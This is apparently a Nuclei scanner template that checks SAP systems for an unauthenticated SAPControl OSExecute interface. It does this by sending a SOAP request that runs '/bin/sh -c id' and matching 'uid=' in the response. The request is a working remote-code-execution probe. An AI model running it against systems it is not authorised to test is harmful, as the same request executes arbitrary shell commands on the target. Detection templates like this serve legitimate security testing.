nuclei-v3/S/sap-osexecute-rce.yaml

http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - OSExecuteResponse
    - <output>
  - part: body
    regex:
    - uid=[0-9]+\(
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=UTF-8\n\
    SOAPAction: '\"\"'\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<SOAP-ENV:Envelope\
    \ xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <SOAP-ENV:Header>\n\
    \    <sapsess:Session xmlns:sapsess=\"http://www.sap.com/webas/630/soap/features/session/\"\
    >\n      <enableSession>true</enableSession>\n    </sapsess:Session>\n  </SOAP-ENV:Header>\n\
    \  <SOAP-ENV:Body>\n    <ns1:OSExecute xmlns:ns1=\"urn:SAPControl\">\n      <command>/bin/sh\
    \ -c id</command>\n      <async>0</async>\n    </ns1:OSExecute>\n  </SOAP-ENV:Body>\n\
    </SOAP-ENV:Envelope>\n"
id: sap-osexecute-rce
info:
  author: LRVT,l4rm4nd
  description: 'Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl
    SOAP interface exposes the OSExecute web method without authentication.

    '
  metadata:
    max-request: 1
  name: SAPControl OSExecute - Remote Code Execution (RCE)
  reference:
  - https://sapdotbasis.wordpress.com/2019/08/08/sapcontrol-command/
  - https://itsiti.com/csmon/
  - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html
  - https://docs.avantra.com/api/latest/js/sap-control.html
  - https://www.slideshare.net/slideshow/sap-insecurity-scrubbing-sap-clean-with-soap/9951290
  severity: critical
  tags: misconfig,sap,sapcontrol,soap,rce,osexecute
